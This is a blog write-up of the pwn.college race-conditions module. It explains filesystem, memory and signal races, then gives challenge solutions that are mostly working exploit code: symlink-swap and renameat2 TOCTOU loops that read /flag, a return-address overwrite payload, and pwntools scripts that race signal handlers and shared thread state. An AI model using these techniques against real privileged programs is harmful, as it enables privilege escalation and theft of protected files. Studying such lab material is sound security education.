---
layout: post
title:  "Pwn College - Race Conditions"
date:   2024-04-26 19:59:54 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module deals with simple race condition scenarios, including file system races, memory races and signal handler races. 

While most of the challenges were pretty easy up to decent, challenge 6 was the most enlighting to me, as it required exploitation of file system race without the classic option of switch file-to-symlink trick. 


## Filesystem Races

The file system is a shared resource, hence inherently vulnerable to races.

Sometimes the odds of success rate would be too low. We would like in such cases to increase the execution time of the vulnerable window as much as we can. Few options:

### Nice

Assign different scheduling priority for processes running on the CPU. `-20` is high priority, `39` is low. 

Notice theres also ionice for I/O (disk usage, for example). Uses classes 1 2 3, where 3 is low priority.

### Path Complexity

If the program accesses a path, we may slow it down by making a very complicated path - encapsulated within alot of directories. Notice the path limit is 4096 bytes, and each name limit is 256. \
We can further increase the complexity by using symlinks do other long directories. A max limit of 40 symlinks for a specific file. 

A specific pattern is called filesystem-maze, where we have the following structure:

```bash
touch /maze/vuln
mkdir -p /maze/a/1/2/3
mkdir -p /maze/b/1/2/3
ln -s /maze/a/1/2/3 /maze/a_end  
ln -s /maze/b/1/2/3 /maze/b_end
ln -s /maze /maze/a_end/root
ln -s /maze /maze/b_end/root
```

We’ve placed two symlinks for each letter X - `X_end`, pointing to the last directory within `/maze/X`, and `root`, a symlink stored at the last directory, pointing back to the root path `/maze`. 

Then, resolving the path `/maze/a_end/root/b_end/root/` would be much longer. 


## Processes And Threads

Basically, all of them are just `task_struct` in the kernel. 

We can create threads via `libpthread`, which is a wrapper for `clone` with dedicated flags. \
Interestingly, upon spawning threads, `clone` requires setting its first parameter - `child_stack`. \ 
Therefore, we would first have to `mmap` a dedicated region that would serve as a thread’s stack, and deliver it to the child thread. 

Notice there are discrepancies of `libc` and `libpthread` and the real syscall implmenetation. For example, `setuid` syscall sets the UID only for the calling thread, while `libc` handler sets the UID of all of the process's threads. \
Another example is `exit`, which calls `exit_group` to terminate all threads, and not syscall `exit` (which terminates only a single thread). 

Thread termination - usually the calling thread would issue `pthread_join`, which would wait for the new thread to terminate gracefully. \
It is common to also use indicative global vars, which might open a window for races. If multiple threads are writers, we would have to schedule the writes carefully. 

## Memory Races

Memory is also a shared resource, vuln to races. 

An example is a thread that updates a global `size` variable, and a program that checks `size` validity and reads this amount of bytes. \
If the first thread updates the variable in between the check and the use, memory corruption occurs.

Another example is double fetch, between the userland and the kernel. The function `copy_from_user` copies buffer from userspace to kernelspace. The following kernel code is vulnerable:

```c
int check_safety(char *user_buffer, int maximum_size) {
    int size;
    copy_from_user(&size, user_buffer, sizeof(size));
    return size <= maximum_size;
}

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long user_buffer) {
    int size;
    char buffer[16];
    if (!check_safety(user_buffer, 16)) return;
    copy_from_user(&size, user_buffer, sizeof(size));
    copy_from_user(buffer, user_buffer+sizeof(size), size);
}
```

It expects the user buffer to start with 4 bytes describing its size, and 16 bytes of payload. \
If the user changes the first 4 bytes right between the check and the `copy_from_user` call, tweaked size would be set. 

Notice that since this is an `ioctl`, the thread that have issued `device_ioctl` is actually suspended. If the user buffer is shared between multiple threads, that can be overcomed. 

We can also prevent data races via mutexes / semaphores, atomic variables, etc. `valgrind` is also a great tool to detect data races - using `helgrind` and `drd`. 

## Signals

Any signals can be sent to any process, as long as they have the same `rUID`, even if the target process has `eUID` of `0`! This means we can send signals to suid binaries from unprivileged process :)

Custom signals handlers may contain interesting and non trivial race vulns. \ 
A particular special case is **reentrancy**. Assume a signal handler is a function that gets executed by the program commercially. In that case, the function might be interrupted by itself, possibly causing unexpected behavior. 

### Safe Signal Practices

**Do not call any non-reentrant function within the signal handlers!** \
If a single non-reentrant function is being called from a signal handler, the whole handler is considered as non-reentrant. \
In particular, `malloc` and `free` aren’t reentrant, and therefore should be forbidden to use within signal handlers. 

See `man signal-safety`. 


## Challenge 1

The program opens a single file, and sends its content. \
Before sending the content, it first performs two checks: the input file must not be a symlink, nor the `flag` file. Only after the check is performed, the file is being opened. 

This is a classic TOCTOU scenario. We can create a symlink to the flag file, named `a`, and having another process switching `a` to some regular file. 

```bash
# Terminal 1
while /bin/true; do ln -s /flag race; done  

# Terminal 2
while /bin/true; do rm -rf race; touch race ;done

# Terminal 3
/challenge/babyrace_level1.1 race  # Spam this about ~ 5 times
```


## Challenge 2

This challenge is easily solveable by the above method. However, in order to improve statistics, we may use the path-maze trick, as described above. 

```bash
#!/bin/bash

MAZE_ROOT="/home/hacker/maze"
DEPTH=100
NUMBER_OF_ROOTS=10


MAZE_DEPTH_PATH=""

rm -rf "$MAZE_ROOT"
mkdir -p "$MAZE_ROOT"
for i in $(seq "$DEPTH")
do
    MAZE_DEPTH_PATH="$MAZE_DEPTH_PATH/$i"
done

cd "$MAZE_ROOT"
LONG_PATH="$MAZE_ROOT"

for i in $(seq "$NUMBER_OF_ROOTS")
do 
    FULL_PATH="$i""$MAZE_DEPTH_PATH"
    mkdir -p "$FULL_PATH"
    END_NAME="$i""_end"
    ROOT_PATH="$END_NAME/root"
    LONG_PATH="$LONG_PATH""/""$ROOT_PATH"
    ln -s "$FULL_PATH" "$END_NAME"
    ln -s "$MAZE_ROOT" "$ROOT_PATH"
done

echo "LONG_PATH:$LONG_PATH"
cd ".."
```

Now we create a file named `maze/race`. For the fast route (the two worker processes), we would access it directly via `maze/race`. 

For the slow route (the executing program), we would access it via `maze/1_end/root/2_end/root/.../race`. 

In order to increase the race odds, I’ve also used the following C program, running in background:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


const char* FILENAME = "/home/hacker/maze/race";
const char* FLAG = "/flag";

void work()
{
    unlink(FILENAME);
    open(FILENAME, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    unlink(FILENAME);
    symlink(FLAG, FILENAME);
}


int main()
{
    while(1) { work(); }
}
```

## Challenge 3

Now theres a `win` variable located somewhere on the stack. 

Before `write` is being issued from the open fd towards the stack , an asserting of the file size being less than 256 is being made. We can bypass this via race on the file’s size. 

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


const char* FILENAME = "/home/hacker/maze/race";
const char* FLAG = "/flag";
char PADDING[4096] = {0};


void work()
{
    int res = -1;
    int fd = -1;

    /* Phase 1 - Create empty file */
    fd = open(FILENAME, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    res = close(fd);

    /* Phase 2 - Create large file*/
    fd = open(FILENAME, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    res = write(fd, PADDING, sizeof(PADDING));
    res = close(fd);
}

int main()
{
    memset(PADDING, 0x41, sizeof(PADDING));
    while(1) { work(); }
}
```

## Challenge 4

Similar to before, but now we’d like to overwrite the return address so that it would point towards `win`. 

No canary, so I’ve just spammed the RA within the stack. 

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>


const char* FILENAME = "/home/hacker/maze/race";
const char* FLAG = "/flag";
char PAYLOAD[4096] = {0};


void prepare_payload()
{
    /* Initialize */
    memset(PAYLOAD, 0x41, sizeof(PAYLOAD));

    /* Overwrite Return address */
    uint64_t win_addr = 0x4012f6;
    uint64_t offset = 0x100;
    while (offset < sizeof(PAYLOAD))
    {
        memcpy(PAYLOAD + offset, &win_addr, sizeof(win_addr));
        offset += sizeof(win_addr);
    }
}

void work()
{
    int res = -1;
    int fd = -1;

    /* Phase 1 - Create empty file */
    fd = open(FILENAME, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    res = close(fd);

    /* Phase 2 - Create large file*/
    fd = open(FILENAME, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    res = write(fd, PAYLOAD, sizeof(PAYLOAD));
    res = close(fd);
}


int main()
{
    prepare_payload();
    while(1) { work(); }
}
```

## Challenge 5

Now the race is harder - as there's an extra verification where the target file must reside within a directory owned by root, and other users are not able to create files there.

In addition to the regular checks that are being made on the set file, now there are extra checks regarding the directory of the file. This means we should overcome  a race with a much less probable statistics now. 

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdint.h>
#include <stdlib.h>


#define DIRNAME "maze"
#define REGULAR_FILENAME "race"
#define FLAG "/flag"
#define TMPREGFILEDIR "aaa"
#define TMPSYMFILEDIR "bbb"
#define TMPSYMLINKDIR "ccc"


void create_reg_file_dir()
{
    int res = -1;
    int fd = -1;
    res = unlink(TMPREGFILEDIR "/" REGULAR_FILENAME); // Clean any previous existing content 
    res = rmdir(TMPREGFILEDIR);  // Clean any previous existing dir
    res = unlink(TMPREGFILEDIR);  // Clean any previous existing dir
    res = mkdirat(AT_FDCWD, TMPREGFILEDIR, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    fd = openat(AT_FDCWD, TMPREGFILEDIR "/" REGULAR_FILENAME, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    res = close(fd);
}


void create_sym_file_dir()
{
    int res = -1;
    int fd = -1;
    res = unlink(TMPSYMFILEDIR "/" REGULAR_FILENAME); // Clean any previous existing content 
    res = rmdir(TMPSYMFILEDIR);  // Clean any previous existing dir
    res = unlink(TMPSYMFILEDIR);  // Clean any previous existing dir
    res = mkdirat(AT_FDCWD, TMPSYMFILEDIR, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    res = symlinkat(FLAG, AT_FDCWD, TMPSYMFILEDIR "/" REGULAR_FILENAME);
}


void create_symlink_dir()
{
    int res = -1;
    int fd = -1;
    res = unlink(TMPSYMLINKDIR "/" REGULAR_FILENAME); // Clean any previous existing content 
    res = rmdir(TMPSYMLINKDIR);  // Clean any previous existing dir
    res = unlink(TMPSYMLINKDIR);  // Clean any previous existing dir
    res = symlinkat("/", AT_FDCWD, TMPSYMLINKDIR);
}


void create_dirs()
{
    int res = -1;

    /* Create the regular directory */
    res = mkdirat(AT_FDCWD, DIRNAME, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);

    /* Directory that always contains a regular file*/
    create_reg_file_dir();

    /* Directory that always contains a symlink */
    create_sym_file_dir();

    /* Directory that is always a symlink to the root directory */
    create_symlink_dir();
}


void work()
{
    int res = -1;
    int fd = -1;
    
    /* Phase 1 - Switch to a regular directory that stores a regular file */    
    res = renameat2(AT_FDCWD, TMPREGFILEDIR, AT_FDCWD, DIRNAME, RENAME_EXCHANGE);  // Now "aaa" and "maze" contents are switched 
    create_reg_file_dir();
    // printf("Created maze with regular file\n");
    // sleep(10);

    /* Phase 2 - Switch to a legitimate directory path, by using a symlink of the directory towards the root directory */
    res = renameat2(AT_FDCWD, TMPSYMLINKDIR, AT_FDCWD, DIRNAME, RENAME_EXCHANGE);
    create_symlink_dir();
    // printf("Created maze as a symlink\n");
    // sleep(10);

    /* Phase 3 - Switch to a regular directory that contains a symlink to "/flag" file */
    res = renameat2(AT_FDCWD, TMPSYMFILEDIR, AT_FDCWD, DIRNAME, RENAME_EXCHANGE);
    create_sym_file_dir();
    //printf("Created maze as a directory containing a symlink\n");
    //sleep(10);    
}

int main()
{
    create_dirs();
    while(1) { work(); }
}
```

And simply execute:

```bash
# Terminal 1
./worker_loop  

# Terminal 2
while /bin/true; do /challenge/babyrace_level5.1 maze/race; done
```

This challenge contains few important insights:

- Upon exploiting race conditions, we would first like to identify all of the “correct” states the program is required to pass. In this case, there are 3 states: `regular_dir + regular_file -> regular_dir + symlink -> symlink_dir`

- The exploit must preserve the ordering of the required states. 

- We would like to create shortest as possible, or preferrably - none at all, states that are not mandatory for the exploitation. For example, consider I would use `unlink` on the directory in between the  phases. In that case, there would be a time fracion where there’s no directory at all, hence creating a 4th state - of an empty directory.  Since this state is invalid, it would’ve hurt the exploitation statistics dramatically. 

- For the above reason, using techniques such as copy-and-swap are ideal for TOCTOU exploitation. While the directory is still in some legitimate state, create a copy of the preceding legit state, and “atomically” switch the state to the newer. In this challenge, I've one this by calling `renameat2` - a special syscall that does exactly this. 

## Challenge 6

This challenge is actually pretty wacky.

The previous challenge’s directory checks were made via `stat`, hence we could provide a symlink to the `“/”` directory, passing the check. However, now the check is also performed via `lstat`, so it doesn’t follows the symlink but retrieves information about the link itself! This means we won’t be able to bypass this check with the same approach. \
At a first glance, this seems impossible to exploit - we have to write our flag at some controlled directory, but this exact directory is being checked to be non-writeable...

My first idea was to use special files within `procfs`. In particular, if we would launch the challenge from the home directory, and supply `/proc/self/cwd/race` as the argument of the program, we would pass the directory tests, as `/proc/self/cwd` is a symlink, and the `ltrace` would retrieve information regarding this **privileged** process `procfs`, which is owned by root and isn’t writeable. \
Interestingly, this approach does passes the root `uid` and root `gid` checks, but doesn’t passes the `other` users write check. This is because `/proc/self/cwd` is a symlink, hence contains all of its permission bits set up by default.. crap. 

Another approach, assumes the following files layout: `~/a/dir/race`. Recall the directory checks are actually checking the **whole** `~/a/dir` expression. What if `a` would be a symlink, too? \
We are able to set `a` as an alternating directory - between regular directory, and a symlink to `"/"`. Moreover, we would rename `dir` to be `boot`. That way, the inserted input would be `a/boot/race`. 

So we would have 3 states:

```bash
a, boot, race all are regular files
a and boot are regular files, race is symlink to "/flag"
a is a symlink to "/". That way a/boot would be resolved to "/boot" and pass the check
```

POC:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdint.h>
#include <stdlib.h>
#include <libgen.h>


#define DIRDIRNAME "/home/hacker/noder"
#define DIRNAME "boot"
#define REGULAR_FILENAME "race"
#define FLAG "/flag"
#define TMPREGFILEDIR "aaa"
#define TMPSYMFILEDIR "bbb"
#define TMPSYMLINKDIR "ccc"


void create_reg_file_dir()
{
    int res = -1;
    int fd = -1;
    res = unlink(TMPREGFILEDIR "/" DIRNAME "/" REGULAR_FILENAME); // Clean any previous existing content 
    res = rmdir(TMPREGFILEDIR "/" DIRNAME);  // Clean any previous existing dir
    res = unlink(TMPREGFILEDIR "/" DIRNAME);
    res = rmdir(TMPREGFILEDIR);
    res = unlink(TMPREGFILEDIR);
    res = mkdirat(AT_FDCWD, TMPREGFILEDIR, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    res = mkdirat(AT_FDCWD, TMPREGFILEDIR "/" DIRNAME, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    fd = openat(AT_FDCWD, TMPREGFILEDIR "/" DIRNAME "/" REGULAR_FILENAME, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH);
    res = close(fd);
}


void create_sym_file_dir()
{
    int res = -1;
    int fd = -1;
    res = unlink(TMPSYMFILEDIR "/" DIRNAME "/" REGULAR_FILENAME); // Clean any previous existing content 
    res = rmdir(TMPSYMFILEDIR "/" DIRNAME);  // Clean any previous existing dir
    res = unlink(TMPSYMFILEDIR "/" DIRNAME);
    res = rmdir(TMPSYMFILEDIR);
    res = unlink(TMPSYMFILEDIR);
    res = mkdirat(AT_FDCWD, TMPSYMFILEDIR, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    res = mkdirat(AT_FDCWD, TMPSYMFILEDIR "/" DIRNAME, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    res = symlinkat(FLAG, AT_FDCWD, TMPSYMFILEDIR "/" DIRNAME "/" REGULAR_FILENAME);
}


void create_symlink_dir()
{
    int res = -1;
    int fd = -1;
    res = unlink(TMPSYMLINKDIR "/" DIRNAME "/" REGULAR_FILENAME); // Clean any previous existing content 
    res = rmdir(TMPSYMLINKDIR "/" DIRNAME);  // Clean any previous existing dir
    res = unlink(TMPSYMLINKDIR "/" DIRNAME);
    res = rmdir(TMPSYMLINKDIR);  // Clean any previous existing dir
    res = unlink(TMPSYMLINKDIR);  // Clean any previous existing dir
    res = symlinkat("/", AT_FDCWD, TMPSYMLINKDIR);
}


void create_dirs()
{
    int res = -1;

    /* Create the regular directories */
    res = mkdirat(AT_FDCWD, DIRDIRNAME, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);
    res = mkdirat(AT_FDCWD, DIRDIRNAME "/" DIRNAME, S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH | S_IXUSR | S_IXGRP | S_IXOTH);

    /* Directory that always contains a regular file*/
    create_reg_file_dir();

    /* Directory that always contains a symlink */
    create_sym_file_dir();

    /* Directory that is always a symlink to the root directory */
    create_symlink_dir();
}


void work()
{
    int res = -1;
    int fd = -1;
    
    /* Phase 1 - Switch to a regular directory that stores a regular file */    
    res = renameat2(AT_FDCWD, TMPREGFILEDIR, AT_FDCWD, DIRDIRNAME, RENAME_EXCHANGE);  // Now "aaa" and "maze" contents are switched 
    create_reg_file_dir();
    
    printf("Created dir with regular file\n");
    sleep(10);

    /* Phase 2 - Switch to a legitimate directory path, by using a symlink of the directory towards the root directory */
    res = renameat2(AT_FDCWD, TMPSYMLINKDIR, AT_FDCWD, DIRDIRNAME, RENAME_EXCHANGE);
    create_symlink_dir();
    printf("Created dir as a symlink\n");
    sleep(10);

    /* Phase 3 - Switch to a regular directory that contains a symlink to "/flag" file */
    res = renameat2(AT_FDCWD, TMPSYMFILEDIR, AT_FDCWD, DIRDIRNAME, RENAME_EXCHANGE);
    create_sym_file_dir();
    printf("Created dir as a directory containing a symlink\n");
    sleep(10);    
}


int main()
{
    create_dirs();
    while(1) { work(); }

    return 0;
}
```

## Challenge 7

Now we’re given a prompt, containing 4 handlers - `login, logout, win_authed, quit`. Right upon login, priviledges drops from `0` to `1`, and we cannot call `win_authed` - which requires priviledges of `0`.  

Interestingly, this program is single threaded - and the only tricky part within the implementation is the `SIGALARM` usage. The `SIGALARM` handler sets the priviledged level to `0` (high). \
Upon calling the login handler, it sets a `SIGALARM` callback that would be issued in 10 minutes, which would drop the priviledges, sets `priv = 1`. 

The logout handler decrements the priv. Pseudo code:

```python
def login():
  set_sighandler()
  priv = 1

def logout():
  if priv != 0
    priv -= 1

def sigalarm_handler():
  priv = 0
```

The `win_authed` handler checks that the current privileges aren’t `0` (meaning, someone is logged in) as well as well as not unprivileged (aren’t `1`). Hence, any number that isn’t 0 or 1 should pass. 

If we would send a signal right before `priv -= 1` occurs, we would be able to set `priv == -1`, and call `win_authed` easily. 

```python
from glob import glob
from dataclasses import dataclass
from pwn import *
import os, sys
import struct
import time
import shutil
import signal


BINARY = glob('/challenge/*')[0]
GDB_SCRIPT= '''
'''


context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')


def change_privs(p, n):
    for i in range(n):
        print(f'iteration:{i}')
        p.sendline('login')
        # p.sendline('PAUSED')
        p.sendline('logout')
        os.kill(p.pid, signal.SIGALRM)
        # p.sendline('PAUSED')
        p.sendline('win_authed')

        data = p.recv()
        print(f'data:{data}')


def main():
    p = process(BINARY)  
    change_privs(p, n=50000)
    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 8

Unlimited TCP connections, to port `1337`. This time an handler is set to `SIGPIPE`, but it doesn’t seem to do anything interesting .

However, the server calls `pthread_create` for every new connection, while the priviledge level is a global variable that is shared among the threads. 

If we would spam increments and decrements of this global variable from two different threads, we would be able to corrupt it to some unintended value, such as `2`, and execute `win_authed`. 

```python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import signal

BINARY = glob('/challenge/*')[0]
GDB_SCRIPT= '''
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

def get_pid(name):
    return int(check_output(["pidof","-s",name]))


def exploit(p1, p2, n):
    for i in range(n):
        print(f'iteration:{i}')
        p1.sendline('login')
        # p1.sendline('PAUSED')
        p2.sendline('login')
        # p2.sendline('PAUSED')
        
        p1.sendline('logout')
        p2.sendline('logout')
        time.sleep(0.05)
        # p1.sendline('PAUSED')
        # p2.sendline('PAUSED')

        p1.sendline('win_authed')
        data = p1.recv()
        print(f'data:{data}')


def main(): 
    p1 = remote('0.0.0.0', 1337)
    p2 = remote('0.0.0.0', 1337)
    exploit(p1, p2, n=50000)


if __name__ == '__main__':
    main()
```

## Challenge 9

Now there are 4 handlers: `send_message, send_redacted_flag, receive_message, quit`.

`send_message` allows sending up to 127 bytes of message, and eventually calls `broadcast_message`. The message is stored within a `global_message` of 128 bytes, shared among the multiple threads. 

`recv_message` handler simply prints the current `global_message`. It does so by computing `strlen` on the global buffer, then printing that amount of bytes to `stdout`. 

`send_redacted_flag` handler reads the flag into the continuation of buffer starting by a `"REDACTED: "` string. \
However, notice the offset in which the flag bytes are read are actually 1 byte past the constant string. Hence, it contains a null byte at offset `buf[10]`. 

If we would overwrite `buf[10]` to some non-null byte character, the `recv_buffer` handler would print the whole flag buffer. Notice that `broadcast_message` also sets `buf[size]` to null byte, hence truncates the string back again. \
This means if we would send a string of length `11` via `send_message` handler, there would be an interesting race at bytes `[10], [11]`. At the goal state, we would like both of these bytes to be non-null. 

```python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import signal

BINARY = glob('/challenge/*')[0]
GDB_SCRIPT= '''
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')


def exploit(p1, p2, n):
    message = b'A' * 11

    for i in range(n):
        print(f'iteration:{i}')
        p1.sendline('send_redacted_flag')
        # Overwrite exactly 11 bytes, up to buf[10] including
        for _ in range(len(message)):  
            p1.sendline('PAUSED')
        time.sleep(0.05)

        # Overwrite 12 bytes, up to buf[11] including. Recall the last byte is buf[size]=0, as broadcast_message truncates the string
        p2.sendline('send_message')
        p2.sendline(message)
        for _ in range(len(message)):
            p2.sendline('PAUSED')
        time.sleep(0.05)

        for _ in range(65 - len(message)):
            p1.sendline('PAUSED')
        p1.sendline('receive_message')
        time.sleep(0.05)

        data1 = p1.recv()
        data2 = p1.recv()
        print(f'data1:{data1}\n\n\n\ndata2:{data2}')
        break


def main(): 
    p1 = remote('0.0.0.0', 1337)
    p2 = remote('0.0.0.0', 1337)
    exploit(p1, p2, n=50000)


if __name__ == '__main__':
    main()
```

Recall our desired order:

```bash
p1 write buf[10] - null byte
p2 writes buf[10] - not null byte
p2 writes buf[11] - null byte
p1 writes buf[11] - not null byte
```

For this to hapen, we would like `p1` to have LOW scheduling priority, while `p2` to have high scheduling priority. That way, `p1` would be interrupted as much as possible. \
We can achieve this using `nice`:

```bash
# Terminal 1
python -c 'print("send_message\nAAAAAAAAAAA\n" * 5000000)' | nice -n 39 nc 0 1337

# Terminal 2
python -c 'print("send_redacted_flag\n" * 5000000)' | nice -n -19 nc 0 1337

# Terminal 3
python -c 'print("receive_message\n" * 5000000)' | nice -n -19 nc 0 1337 &> result
```

## Challenges 10, 11

Same scenario, now the race odds are lower. Same exploit works here too. 
